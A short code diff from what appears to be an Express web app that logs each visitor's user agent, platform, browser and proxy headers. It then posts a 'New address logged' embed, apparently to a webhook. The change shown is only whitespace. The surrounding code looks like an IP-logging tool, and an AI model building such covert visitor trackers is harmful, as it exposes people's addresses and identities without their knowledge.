@@ -19,7 +19,7 @@ app.get("/", async (req, res) => {
   const platform = userAgent ? userAgent.split("(")[1].split(")")[0] : "Unknown";
   const browser = userAgent ? userAgent.split("/")[0] : "Unknown";
   const isProxy = req.headers["via"] || req.headers["x-forwarded-for"];
-  try {
+  try { 
     const embed = new MessageBuilder()
       .setTitle("Cloud9 Sync")
       .setDescription("New address logged.")
